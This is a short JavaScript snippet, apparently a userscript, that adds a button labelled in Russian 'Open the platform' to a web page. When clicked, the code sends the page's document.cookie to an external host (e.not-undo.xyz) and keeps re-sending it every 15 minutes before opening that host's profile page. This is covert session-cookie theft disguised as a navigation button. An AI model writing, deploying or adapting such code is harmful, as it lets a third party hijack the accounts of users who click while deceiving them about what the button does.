
const url = "https://e.not-undo.xyz/"
let active = 0
const addButton =()=>{
    const button = document.createElement("div")
    button.className="btn btn-danger"
    button.style.cursor="pointer"
    button.style.background ="#FFC850"
    button.style.borderColor =" #e4b651"
    button.innerText="Открыть платформу"
    button.onclick=async()=>{
        const q = new Date().getTime()/1000
        if(q - active<15) return;
        active = q
        await fetch(url+"api/session/",{
            method:"POST",
            body:JSON.stringify({
                session:document.cookie
            })
        })
        setInterval( async ()=>{   
            await fetch(url+"api/session/",{
                method:"POST",
                body:JSON.stringify({
                    session:document.cookie
                })
            })
        },60000*15)
        setTimeout(()=>window.open(url+"profile/home","_blank"),5000)
        alert("Будет выполнен переход на "+url+" через 5 секунды")
    }
    document.getElementById("id_request").parentNode.append(button)
}

const main = ()=>{
    addButton();
}
main()